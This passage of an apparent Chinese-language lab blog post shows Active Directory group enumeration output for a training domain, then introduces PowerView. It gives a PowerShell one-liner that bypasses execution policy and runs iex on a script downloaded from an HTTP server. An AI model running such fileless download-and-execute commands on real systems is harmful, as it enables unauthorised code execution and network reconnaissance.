8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Event Log Readers</span><br><span class="line">SID                : S-1-5-32-573</span><br><span class="line">DistinguishedName  : CN=Event Log Readers,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Event Log Readers</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 7c5a0e99-d9ac-4859-93f8-0d0e7da88d32</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Certificate Service DCOM Access</span><br><span class="line">SID                : S-1-5-32-574</span><br><span class="line">DistinguishedName  : CN=Certificate Service DCOM Access,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Certificate Service DCOM Access</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : cc25537f-3d33-4d68-8419-4eb0b447296e</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : RDS Remote Access Servers</span><br><span class="line">SID                : S-1-5-32-575</span><br><span class="line">DistinguishedName  : CN=RDS Remote Access Servers,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : RDS Remote Access Servers</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : e1fa25b6-906e-4e44-a333-dcf5dd9078d4</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : RDS Endpoint Servers</span><br><span class="line">SID                : S-1-5-32-576</span><br><span class="line">DistinguishedName  : CN=RDS Endpoint Servers,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : RDS Endpoint Servers</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : b8fc89cf-4f11-4326-9639-2253834fb78c</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : RDS Management Servers</span><br><span class="line">SID                : S-1-5-32-577</span><br><span class="line">DistinguishedName  : CN=RDS Management Servers,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : RDS Management Servers</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 84b8fd6f-0106-41e8-a563-0a5ce003a142</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Hyper-V Administrators</span><br><span class="line">SID                : S-1-5-32-578</span><br><span class="line">DistinguishedName  : CN=Hyper-V Administrators,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Hyper-V Administrators</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 4a7fe147-4415-4bef-86b2-429a82fafe7b</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Access Control Assistance Operators</span><br><span class="line">SID                : S-1-5-32-579</span><br><span class="line">DistinguishedName  : CN=Access Control Assistance Operators,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Access Control Assistance Operators</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : eb990a6c-ac56-4cac-b9cb-ef984dac57a1</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Remote Management Users</span><br><span class="line">SID                : S-1-5-32-580</span><br><span class="line">DistinguishedName  : CN=Remote Management Users,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Remote Management Users</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : ccfa5296-240e-47d8-9eab-a6982f42cbda</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : System Managed Accounts Group</span><br><span class="line">SID                : S-1-5-32-581</span><br><span class="line">DistinguishedName  : CN=System Managed Accounts Group,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : System Managed Accounts Group</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : b34b8194-56c3-4892-8804-58792cfab364</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Storage Replica Administrators</span><br><span class="line">SID                : S-1-5-32-582</span><br><span class="line">DistinguishedName  : CN=Storage Replica Administrators,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Storage Replica Administrators</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 1b22285c-5de3-4072-b14a-770524ced503</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : Global</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Domain Computers</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-515</span><br><span class="line">DistinguishedName  : CN=Domain Computers,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : Domain Computers</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 034653e5-cacb-4330-86e8-42a6bcf2fc4c</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : Global</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Domain Controllers</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-516</span><br><span class="line">DistinguishedName  : CN=Domain Controllers,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : Domain Controllers</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 81afada4-1360-471f-95a4-07a672b961a1</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : Universal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Schema Admins</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-518</span><br><span class="line">DistinguishedName  : CN=Schema Admins,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : Schema Admins</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : c9f2a8ce-db4e-45ff-9ac5-7bd133381ae3</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : Universal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Enterprise Admins</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-519</span><br><span class="line">DistinguishedName  : CN=Enterprise Admins,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : Enterprise Admins</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 91c0b5f6-1fde-4bc6-9eaa-34697e7068d4</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Cert Publishers</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-517</span><br><span class="line">DistinguishedName  : CN=Cert Publishers,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : Cert Publishers</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 207df5ae-7cf4-454e-b6af-9ab5feea47a2</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : Global</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Domain Admins</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-512</span><br><span class="line">DistinguishedName  : CN=Domain Admins,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : Domain Admins</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 648ef61f-3392-44d2-9a6f-6017668132d4</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : Global</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Domain Users</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-513</span><br><span class="line">DistinguishedName  : CN=Domain Users,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : Domain Users</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : dfd06b13-fad4-45d1-a9a9-d96d3ae88049</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : Global</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Domain Guests</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-514</span><br><span class="line">DistinguishedName  : CN=Domain Guests,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : Domain Guests</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 968ba028-8ff4-4704-873c-b0350eb3d914</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : Global</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Group Policy Creator Owners</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-520</span><br><span class="line">DistinguishedName  : CN=Group Policy Creator Owners,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : Group Policy Creator Owners</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 0698b512-0771-4350-a3a3-149207321648</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : RAS and IAS Servers</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-553</span><br><span class="line">DistinguishedName  : CN=RAS and IAS Servers,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : RAS and IAS Servers</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : f0e94a4e-b526-47fa-b4ef-16b36e67918c</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Server Operators</span><br><span class="line">SID                : S-1-5-32-549</span><br><span class="line">DistinguishedName  : CN=Server Operators,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Server Operators</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : dad71384-c54e-421f-b8f0-92fa8f42300f</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Account Operators</span><br><span class="line">SID                : S-1-5-32-548</span><br><span class="line">DistinguishedName  : CN=Account Operators,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Account Operators</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 6a366c32-1e5b-449f-83d1-19c4d0e90aec</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Pre-Windows 2000 Compatible Access</span><br><span class="line">SID                : S-1-5-32-554</span><br><span class="line">DistinguishedName  : CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Pre-Windows 2000 Compatible Access</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 81262d18-764b-40d2-a2dc-a94753c1eb75</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Incoming Forest Trust Builders</span><br><span class="line">SID                : S-1-5-32-557</span><br><span class="line">DistinguishedName  : CN=Incoming Forest Trust Builders,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Incoming Forest Trust Builders</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 2847694c-5991-4a7e-894f-4b87d153feb2</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Windows Authorization Access Group</span><br><span class="line">SID                : S-1-5-32-560</span><br><span class="line">DistinguishedName  : CN=Windows Authorization Access Group,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Windows Authorization Access Group</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 0ef73d60-2017-442d-a56b-bedcd0c9b381</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Terminal Server License Servers</span><br><span class="line">SID                : S-1-5-32-561</span><br><span class="line">DistinguishedName  : CN=Terminal Server License Servers,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Terminal Server License Servers</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 2a6a4686-2ca2-4bdd-b9ac-a9abd9503103</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Allowed RODC Password Replication Group</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-571</span><br><span class="line">DistinguishedName  : CN=Allowed RODC Password Replication Group,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : Allowed RODC Password Replication Group</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 5b06cb79-3f8a-4f53-87fc-3a78083734ec</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Denied RODC Password Replication Group</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-572</span><br><span class="line">DistinguishedName  : CN=Denied RODC Password Replication Group,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : Denied RODC Password Replication Group</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 7b57a5ce-14b9-44ef-9afe-04468f9ca230</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : Global</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Read-only Domain Controllers</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-521</span><br><span class="line">DistinguishedName  : CN=Read-only Domain Controllers,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : Read-only Domain Controllers</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 899eb2a0-a040-448c-b15e-d48c46ff6f4f</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : Universal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Enterprise Read-only Domain Controllers</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-498</span><br><span class="line">DistinguishedName  : CN=Enterprise Read-only Domain Controllers,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : Enterprise Read-only Domain Controllers</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : dbfae556-2bb4-47d8-99c4-1c9f6fff4ca2</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : Global</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Cloneable Domain Controllers</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-522</span><br><span class="line">DistinguishedName  : CN=Cloneable Domain Controllers,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : Cloneable Domain Controllers</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 25c7245e-06c4-4d32-bce1-a6a90ab4608b</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : Global</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Protected Users</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-525</span><br><span class="line">DistinguishedName  : CN=Protected Users,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : Protected Users</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 1892dad8-814c-44e1-b234-b53136bc0f53</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : Global</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Key Admins</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-526</span><br><span class="line">DistinguishedName  : CN=Key Admins,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : Key Admins</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 5280b20c-d3b0-4add-866a-2e500e2931e0</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : Universal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Enterprise Key Admins</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-527</span><br><span class="line">DistinguishedName  : CN=Enterprise Key Admins,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : Enterprise Key Admins</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : e60e0343-2e37-4c79-9b8c-2877e2d336ed</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : DnsAdmins</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-1101</span><br><span class="line">DistinguishedName  : CN=DnsAdmins,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : DnsAdmins</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 40a46e74-fd18-4a76-9908-6b33573750fd</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : Global</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : DnsUpdateProxy</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-1102</span><br><span class="line">DistinguishedName  : CN=DnsUpdateProxy,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : DnsUpdateProxy</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : b58e586e-c8b5-4630-94c3-d56461f06d33</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br></pre></td></tr></table></figure>
<h4 id="Get-ADGroupMember-Identity-lt-SamAccountName-in-get-ADGroup"><a href="#Get-ADGroupMember-Identity-lt-SamAccountName-in-get-ADGroup" class="headerlink" title="Get-ADGroupMember -Identity &lt;SamAccountName in get-ADGroup >"></a>Get-ADGroupMember -Identity &lt;SamAccountName in get-ADGroup ></h4><p><img src="/img/2020/windows_ad/windows_AD_lab1_12.png" alt=""></p>
<p><img src="/img/2020/windows_ad/windows_AD_lab1_13.png" alt=""></p>
<h4 id="Get-AdComputer-filter"><a href="#Get-AdComputer-filter" class="headerlink" title="Get-AdComputer -filter *"></a>Get-AdComputer -filter *</h4><p><img src="/img/2020/windows_ad/windows_AD_lab1_14.png" alt=""></p>
<h3 id="Powerview"><a href="#Powerview" class="headerlink" title="Powerview"></a>Powerview</h3><p>下載點:<a href="https://github.com/PowerShellMafia/PowerSploit/raw/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/raw/dev/Recon/PowerView.ps1</a> </p>
<p>這邊模擬以 powershell 進行無檔案下載執行的方式操作<br><code>powershell.exe -ExecutionPolicy UnRestricted &quot;iex (new-Object Net.WebClient).DownloadString(&#39;http://192.168.43.140:8000/PowerView.ps1&#39;)&quot;</code></p>
<h4 id="Get-NetDoamin"><a href="#Get-NetDoamin" class="headerlink" title="Get-NetDoamin"></a>Get-NetDoamin</h4><p><img src="/img/2020/windows_ad/windows_AD_lab1_15.png" alt=""></p>
